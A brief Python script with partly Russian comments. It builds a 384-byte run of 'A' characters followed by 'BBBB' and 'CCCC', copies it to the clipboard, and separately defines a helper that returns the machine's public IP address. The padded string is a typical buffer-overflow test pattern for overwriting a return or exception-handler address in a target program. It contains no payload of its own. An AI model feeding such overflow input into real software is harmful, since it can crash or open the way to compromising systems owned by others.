import pyximport # импоритурем Cython
pyximport.install() # инициализируем его
from ipgetter2 import IPGetter # import ipgetter module
import pyperclip # for copy

buffer = "\x41" * 384
str_buffer = buffer + "BBBB" + "CCCC"
pyperclip.copy(str_buffer)

getter = IPGetter() 

# myip function. 
def myip():
    return str(getter.get().v4) # return ip.
